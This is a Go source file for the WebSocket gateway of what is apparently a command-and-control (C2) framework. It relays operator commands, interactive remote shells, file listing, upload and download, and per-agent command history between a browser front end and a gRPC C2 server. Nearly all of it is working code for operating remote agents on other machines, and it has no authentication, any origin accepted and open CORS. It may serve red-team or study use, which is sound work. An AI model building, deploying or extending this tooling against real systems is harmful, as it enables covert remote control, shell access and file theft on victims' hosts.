package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/gorilla/websocket"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

type gateway struct {
	grpcAddr string
	upgrader websocket.Upgrader
}

type session struct {
	id       string
	socket   *websocket.Conn
	grpcAddr string

	ctxMu   sync.RWMutex
	closed  bool
	ctx     context.Context
	cancel  context.CancelFunc
	closeCh chan struct{}

	emitMu sync.Mutex

	stateMu        sync.RWMutex
	conn           *grpc.ClientConn
	operatorStream pb.OperatorService_ConnectClient
	historyClient  pb.HistoryServiceClient
	shellStream    pb.ShellService_OperatorShellClient
	fileStream     pb.FileService_OperatorTransferClient
	operatorSendMu sync.Mutex
	shellSendMu    sync.Mutex
	fileSendMu     sync.Mutex
}

type wsEnvelope struct {
	Event   string          `json:"event"`
	Payload json.RawMessage `json:"payload"`
}

type statusEvent struct {
	Connected bool   `json:"connected"`
	Server    string `json:"server"`
	Message   string `json:"message,omitempty"`
}

type gatewayErrorEvent struct {
	Message string `json:"message"`
}

type operatorEventPayload struct {
	Type    string `json:"type"`
	AgentID string `json:"agentId"`
	Payload string `json:"payload"`
}

type historyEntryPayload struct {
	TaskID      string `json:"taskId"`
	AgentID     string `json:"agentId"`
	Command     string `json:"command"`
	Args        string `json:"args"`
	Output      string `json:"output"`
	ExecutedAt  int64  `json:"executedAt"`
	CompletedAt int64  `json:"completedAt"`
}

type historyResultPayload struct {
	RequestID string                `json:"requestId,omitempty"`
	AgentID   string                `json:"agentId"`
	Entries   []historyEntryPayload `json:"entries"`
}

type historyListRequest struct {
	RequestID string `json:"requestId"`
	AgentID   string `json:"agentId"`
	Limit     int32  `json:"limit"`
}

type commandDispatchRequest struct {
	AgentID string `json:"agentId"`
	Command string `json:"command"`
	Args    string `json:"args"`
}

type shellRequest struct {
	Type      string `json:"type"`
	SessionID string `json:"sessionId"`
	AgentID   string `json:"agentId"`
	Data      string `json:"data"`
	Cols      int32  `json:"cols"`
	Rows      int32  `json:"rows"`
}

type shellEventPayload struct {
	Type      string `json:"type"`
	SessionID string `json:"sessionId"`
	AgentID   string `json:"agentId"`
	Data      string `json:"data,omitempty"`
	Message   string `json:"message,omitempty"`
}

type fileRequest struct {
	Type       string `json:"type"`
	TransferID string `json:"transferId"`
	AgentID    string `json:"agentId"`
	Path       string `json:"path"`
	Data       string `json:"data,omitempty"`
	Message    string `json:"message,omitempty"`
	TotalBytes int64  `json:"totalBytes,omitempty"`
}

type fileEventPayload struct {
	Type             string `json:"type"`
	TransferID       string `json:"transferId"`
	AgentID          string `json:"agentId"`
	Path             string `json:"path,omitempty"`
	Data             string `json:"data,omitempty"`
	Message          string `json:"message,omitempty"`
	IsDir            bool   `json:"isDir,omitempty"`
	Size             int64  `json:"size,omitempty"`
	ModifiedAt       int64  `json:"modifiedAt,omitempty"`
	TotalBytes       int64  `json:"totalBytes,omitempty"`
	TransferredBytes int64  `json:"transferredBytes,omitempty"`
}

type acceptedPayload struct {
	Type       string `json:"type"`
	AgentID    string `json:"agentId,omitempty"`
	SessionID  string `json:"sessionId,omitempty"`
	TransferID string `json:"transferId,omitempty"`
	Message    string `json:"message,omitempty"`
}

var (
	transferCounter atomic.Uint64
	sessionCounter  atomic.Uint64
)

func main() {
	httpHost := flag.String("host", "0.0.0.0", "HTTP host interface for the websocket gateway")
	httpPort := flag.Int("port", 8080, "HTTP port for the websocket gateway")
	grpcHost := flag.String("grpc-host", "localhost", "upstream gRPC server host")
	grpcPort := flag.Int("grpc-port", 50051, "upstream gRPC server port")
	grpcAddrFlag := flag.String("grpc-server", "", "deprecated: full upstream gRPC address")
	flag.Parse()

	grpcAddr := fmt.Sprintf("%s:%d", *grpcHost, *grpcPort)
	if strings.TrimSpace(*grpcAddrFlag) != "" {
		grpcAddr = strings.TrimSpace(*grpcAddrFlag)
	}

	gw := &gateway{
		grpcAddr: grpcAddr,
		upgrader: websocket.Upgrader{
			CheckOrigin: func(*http.Request) bool { return true },
		},
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/ws", gw.handleWS)
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":         true,
			"grpcServer": grpcAddr,
			"time":       time.Now().UTC().Format(time.RFC3339),
		})
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"name":        "c2-websocket gateway",
			"socketPath":  "/ws",
			"grpcServer":  grpcAddr,
			"healthcheck": "/healthz",
		})
	})

	addr := fmt.Sprintf("%s:%d", *httpHost, *httpPort)
	log.Printf("[gateway] websocket gateway listening on %s", addr)
	log.Printf("[gateway] upstream gRPC server %s", grpcAddr)
	if err := http.ListenAndServe(addr, withCORS(mux)); err != nil {
		log.Fatalf("http serve error: %v", err)
	}
}

func (g *gateway) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := g.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[gateway] websocket upgrade error: %v", err)
		return
	}

	sess := newSession(conn, g.grpcAddr)
	sess.emit("gateway:ready", map[string]any{
		"socketId": sess.id,
		"server":   g.grpcAddr,
	})

	go sess.run()
	go sess.readLoop()
}

func newSession(conn *websocket.Conn, grpcAddr string) *session {
	ctx, cancel := context.WithCancel(context.Background())
	return &session{
		id:       fmt.Sprintf("ws-%d", sessionCounter.Add(1)),
		socket:   conn,
		grpcAddr: grpcAddr,
		ctx:      ctx,
		cancel:   cancel,
		closeCh:  make(chan struct{}),
	}
}

func (s *session) readLoop() {
	defer s.close("websocket closed")

	for {
		_, data, err := s.socket.ReadMessage()
		if err != nil {
			return
		}

		var envelope wsEnvelope
		if err := json.Unmarshal(data, &envelope); err != nil {
			s.emitError(fmt.Errorf("invalid websocket message: %w", err))
			continue
		}

		if err := s.handleEnvelope(envelope); err != nil {
			s.emitError(err)
		}
	}
}

func (s *session) handleEnvelope(envelope wsEnvelope) error {
	switch envelope.Event {
	case "command:dispatch":
		var req commandDispatchRequest
		if err := decodePayload(envelope.Payload, &req); err != nil {
			return err
		}
		if err := s.dispatchCommand(req); err != nil {
			return err
		}
		s.emit("command:accepted", acceptedPayload{
			Type:    "command",
			AgentID: req.AgentID,
			Message: "command forwarded to gRPC operator stream",
		})
	case "history:list":
		var req historyListRequest
		if err := decodePayload(envelope.Payload, &req); err != nil {
			return err
		}
		go s.loadHistory(req)
	case "shell:open", "shell:input", "shell:resize", "shell:close":
		var req shellRequest
		if err := decodePayload(envelope.Payload, &req); err != nil {
			return err
		}
		req.Type = strings.TrimPrefix(envelope.Event, "shell:")
		if err := s.sendShell(req); err != nil {
			return err
		}
		if req.Type == "open" {
			s.emit("shell:accepted", acceptedPayload{
				Type:    "shell",
				AgentID: req.AgentID,
				Message: "shell open request forwarded",
			})
		}
	case "file:list", "file:download", "file:upload:start", "file:upload:chunk", "file:upload:end", "file:cancel":
		var req fileRequest
		if err := decodePayload(envelope.Payload, &req); err != nil {
			return err
		}
		req.Type = mapFileEventToType(envelope.Event)
		req.TransferID = ensureTransferID(req.TransferID)
		if err := s.sendFile(req); err != nil {
			s.emit("file:event", fileEventPayload{
				Type:       "error",
				TransferID: req.TransferID,
				AgentID:    req.AgentID,
				Path:       req.Path,
				Message:    err.Error(),
			})
			return nil
		}
		if req.Type == "list" || req.Type == "download" || req.Type == "upload_start" {
			s.emit("file:accepted", acceptedPayload{
				Type:       req.Type,
				AgentID:    req.AgentID,
				TransferID: req.TransferID,
				Message:    "file request forwarded",
			})
		}
	default:
		return fmt.Errorf("unknown event: %s", envelope.Event)
	}
	return nil
}

func decodePayload(raw json.RawMessage, target any) error {
	if len(raw) == 0 || string(raw) == "null" {
		return fmt.Errorf("missing payload")
	}
	if err := json.Unmarshal(raw, target); err != nil {
		return fmt.Errorf("invalid payload: %w", err)
	}
	return nil
}

func mapFileEventToType(event string) string {
	switch event {
	case "file:list":
		return "list"
	case "file:download":
		return "download"
	case "file:upload:start":
		return "upload_start"
	case "file:upload:chunk":
		return "upload_chunk"
	case "file:upload:end":
		return "upload_end"
	case "file:cancel":
		return "cancel"
	default:
		return event
	}
}

func (s *session) run() {
	for {
		if s.isClosed() {
			return
		}

		if err := s.connectUpstream(); err != nil {
			s.emitStatus(false, fmt.Sprintf("upstream connect failed: %v", err))
			if !s.waitReconnect() {
				return
			}
			continue
		}

		s.emitStatus(true, "connected to upstream gRPC server")
		err := s.forwardUpstream()
		if err != nil && !s.isClosed() {
			s.emitStatus(false, fmt.Sprintf("upstream disconnected: %v", err))
		}
		s.resetUpstream()
		if !s.waitReconnect() {
			return
		}
	}
}

func (s *session) waitReconnect() bool {
	timer := time.NewTimer(3 * time.Second)
	defer timer.Stop()

	select {
	case <-s.closeCh:
		return false
	case <-timer.C:
		return true
	}
}

func (s *session) connectUpstream() error {
	conn, err := grpc.Dial(
		s.grpcAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()),
		grpc.WithBlock(),
	)
	if err != nil {
		return err
	}

	operatorClient := pb.NewOperatorServiceClient(conn)
	historyClient := pb.NewHistoryServiceClient(conn)
	shellClient := pb.NewShellServiceClient(conn)
	fileClient := pb.NewFileServiceClient(conn)

	operatorStream, err := operatorClient.Connect(s.context())
	if err != nil {
		_ = conn.Close()
		return err
	}
	shellStream, err := shellClient.OperatorShell(s.context())
	if err != nil {
		_ = operatorStream.CloseSend()
		_ = conn.Close()
		return err
	}
	fileStream, err := fileClient.OperatorTransfer(s.context())
	if err != nil {
		_ = operatorStream.CloseSend()
		_ = shellStream.CloseSend()
		_ = conn.Close()
		return err
	}

	s.stateMu.Lock()
	s.conn = conn
	s.operatorStream = operatorStream
	s.historyClient = historyClient
	s.shellStream = shellStream
	s.fileStream = fileStream
	s.stateMu.Unlock()
	return nil
}

func (s *session) forwardUpstream() error {
	s.stateMu.RLock()
	operatorStream := s.operatorStream
	shellStream := s.shellStream
	fileStream := s.fileStream
	s.stateMu.RUnlock()

	errCh := make(chan error, 3)

	go func() {
		for {
			event, err := operatorStream.Recv()
			if err != nil {
				errCh <- err
				return
			}
			s.emitOperatorEvent(event)
		}
	}()

	go func() {
		for {
			event, err := shellStream.Recv()
			if err != nil {
				errCh <- err
				return
			}
			s.emitShellEvent(event)
		}
	}()

	go func() {
		for {
			event, err := fileStream.Recv()
			if err != nil {
				errCh <- err
				return
			}
			s.emitFileEvent(event)
		}
	}()

	select {
	case <-s.closeCh:
		return nil
	case err := <-errCh:
		return err
	}
}

func (s *session) resetUpstream() {
	s.stateMu.Lock()
	conn := s.conn
	operatorStream := s.operatorStream
	shellStream := s.shellStream
	fileStream := s.fileStream
	s.conn = nil
	s.operatorStream = nil
	s.historyClient = nil
	s.shellStream = nil
	s.fileStream = nil
	s.stateMu.Unlock()

	if operatorStream != nil {
		_ = operatorStream.CloseSend()
	}
	if shellStream != nil {
		_ = shellStream.CloseSend()
	}
	if fileStream != nil {
		_ = fileStream.CloseSend()
	}
	if conn != nil {
		_ = conn.Close()
	}
}

func (s *session) dispatchCommand(req commandDispatchRequest) error {
	if strings.TrimSpace(req.AgentID) == "" {
		return fmt.Errorf("agentId is required")
	}
	if strings.TrimSpace(req.Command) == "" {
		return fmt.Errorf("command is required")
	}

	s.stateMu.RLock()
	stream := s.operatorStream
	s.stateMu.RUnlock()
	if stream == nil {
		return fmt.Errorf("operator stream unavailable")
	}

	s.operatorSendMu.Lock()
	defer s.operatorSendMu.Unlock()

	return stream.Send(&pb.OperatorCommand{
		TargetAgentId: req.AgentID,
		Command:       req.Command,
		Args:          req.Args,
	})
}

func (s *session) loadHistory(req historyListRequest) {
	if strings.TrimSpace(req.AgentID) == "" {
		s.emit("history:list:error", gatewayErrorEvent{Message: "agentId is required"})
		return
	}

	s.stateMu.RLock()
	client := s.historyClient
	s.stateMu.RUnlock()
	if client == nil {
		s.emit("history:list:error", gatewayErrorEvent{Message: "history service unavailable"})
		return
	}

	limit := req.Limit
	if limit <= 0 || limit > 200 {
		limit = 50
	}

	ctx, cancel := context.WithTimeout(s.context(), 5*time.Second)
	defer cancel()

	resp, err := client.ListAgentHistory(ctx, &pb.AgentHistoryRequest{
		AgentId: req.AgentID,
		Limit:   limit,
	})
	if err != nil {
		s.emit("history:list:error", map[string]any{
			"requestId": req.RequestID,
			"agentId":   req.AgentID,
			"message":   err.Error(),
		})
		return
	}

	entries := make([]historyEntryPayload, 0, len(resp.GetEntries()))
	for _, entry := range resp.GetEntries() {
		entries = append(entries, historyEntryPayload{
			TaskID:      entry.GetTaskId(),
			AgentID:     entry.GetAgentId(),
			Command:     entry.GetCommand(),
			Args:        entry.GetArgs(),
			Output:      entry.GetOutput(),
			ExecutedAt:  entry.GetExecutedAt(),
			CompletedAt: entry.GetCompletedAt(),
		})
	}

	s.emit("history:list:result", historyResultPayload{
		RequestID: req.RequestID,
		AgentID:   req.AgentID,
		Entries:   entries,
	})
}

func (s *session) sendShell(req shellRequest) error {
	s.stateMu.RLock()
	stream := s.shellStream
	s.stateMu.RUnlock()
	if stream == nil {
		return fmt.Errorf("shell stream unavailable")
	}

	if req.Type == "open" && strings.TrimSpace(req.AgentID) == "" {
		return fmt.Errorf("agentId is required")
	}
	if req.Type != "open" && strings.TrimSpace(req.SessionID) == "" {
		return fmt.Errorf("sessionId is required")
	}

	s.shellSendMu.Lock()
	defer s.shellSendMu.Unlock()

	return stream.Send(&pb.OperatorShellRequest{
		Type:      req.Type,
		SessionId: req.SessionID,
		AgentId:   req.AgentID,
		Data:      req.Data,
		Cols:      req.Cols,
		Rows:      req.Rows,
	})
}

func (s *session) sendFile(req fileRequest) error {
	s.stateMu.RLock()
	stream := s.fileStream
	s.stateMu.RUnlock()
	if stream == nil {
		return fmt.Errorf("file stream unavailable")
	}

	if strings.TrimSpace(req.TransferID) == "" {
		return fmt.Errorf("transferId is required")
	}
	if req.Type != "cancel" && req.Type != "upload_chunk" && strings.TrimSpace(req.AgentID) == "" {
		return fmt.Errorf("agentId is required")
	}

	var data []byte
	if req.Data != "" {
		decoded, err := base64.StdEncoding.DecodeString(req.Data)
		if err != nil {
			return fmt.Errorf("invalid base64 data: %w", err)
		}
		data = decoded
	}

	s.fileSendMu.Lock()
	defer s.fileSendMu.Unlock()

	return stream.Send(&pb.OperatorFileRequest{
		Type:       req.Type,
		TransferId: req.TransferID,
		AgentId:    req.AgentID,
		Path:       req.Path,
		Data:       data,
		Message:    req.Message,
		TotalBytes: req.TotalBytes,
	})
}

func (s *session) emitOperatorEvent(event *pb.OperatorEvent) {
	payload := operatorEventPayload{
		Type:    event.GetType(),
		AgentID: event.GetAgentId(),
		Payload: event.GetPayload(),
	}
	s.emit("operator:event", payload)
	s.emit("operator:"+event.GetType(), payload)
}

func (s *session) emitShellEvent(event *pb.AgentShellEvent) {
	payload := shellEventPayload{
		Type:      event.GetType(),
		SessionID: event.GetSessionId(),
		AgentID:   event.GetAgentId(),
		Data:      event.GetData(),
		Message:   event.GetMessage(),
	}
	s.emit("shell:event", payload)
	s.emit("shell:"+event.GetType(), payload)
}

func (s *session) emitFileEvent(event *pb.AgentFileEvent) {
	payload := fileEventPayload{
		Type:             event.GetType(),
		TransferID:       event.GetTransferId(),
		AgentID:          event.GetAgentId(),
		Path:             event.GetPath(),
		Message:          event.GetMessage(),
		IsDir:            event.GetIsDir(),
		Size:             event.GetSize(),
		ModifiedAt:       event.GetModifiedAt(),
		TotalBytes:       event.GetTotalBytes(),
		TransferredBytes: event.GetTransferredBytes(),
	}
	if len(event.GetData()) > 0 {
		payload.Data = base64.StdEncoding.EncodeToString(event.GetData())
	}
	s.emit("file:event", payload)
	s.emit("file:"+event.GetType(), payload)
}

func (s *session) emitStatus(connected bool, message string) {
	s.emit("grpc:status", statusEvent{
		Connected: connected,
		Server:    s.grpcAddr,
		Message:   message,
	})
}

func (s *session) emitError(err error) {
	if err == nil {
		return
	}
	s.emit("gateway:error", gatewayErrorEvent{Message: err.Error()})
}

func (s *session) emit(event string, payload any) {
	frame, err := json.Marshal(map[string]any{
		"event":   event,
		"payload": payload,
	})
	if err != nil {
		log.Printf("[gateway] marshal emit %s failed: %v", event, err)
		return
	}

	s.emitMu.Lock()
	defer s.emitMu.Unlock()
	if err := s.socket.WriteMessage(websocket.TextMessage, frame); err != nil {
		log.Printf("[gateway] emit %s to %s failed: %v", event, s.id, err)
	}
}

func (s *session) close(reason string) {
	s.ctxMu.Lock()
	if s.closed {
		s.ctxMu.Unlock()
		return
	}
	s.closed = true
	close(s.closeCh)
	s.ctxMu.Unlock()

	s.cancel()
	s.resetUpstream()
	_ = s.socket.Close()
	if reason != "" {
		log.Printf("[gateway] session %s closed: %s", s.id, reason)
	}
}

func (s *session) isClosed() bool {
	s.ctxMu.RLock()
	defer s.ctxMu.RUnlock()
	return s.closed
}

func (s *session) context() context.Context {
	return s.ctx
}

func ensureTransferID(transferID string) string {
	transferID = strings.TrimSpace(transferID)
	if transferID != "" {
		return transferID
	}
	return fmt.Sprintf("%d-%d", time.Now().UnixNano(), transferCounter.Add(1))
}

func withCORS(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}
